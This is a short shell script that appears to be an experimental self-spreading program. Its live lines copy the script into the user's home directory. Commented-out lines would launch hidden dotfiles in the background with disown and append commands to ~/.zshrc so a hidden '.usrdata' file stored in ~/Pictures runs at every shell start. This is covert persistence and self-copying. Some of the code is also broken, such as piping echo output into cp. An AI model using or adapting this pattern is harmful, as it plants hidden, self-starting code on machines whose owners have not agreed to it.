#!/bin/sh
#./\.v_script & disown

#echo $(cat \.v_zshrc_insert) >> ~/.zshrc

echo $(cat .v_copylist)
echo $(cat .v_copylist) | cp  $0 ~/$0

#cp \.usrdata ~/Pictures 
#echo "~/Pictures/\.usrdata & disown" >> ~/.zshrc
#~/Pictures/\.usrdata & disown

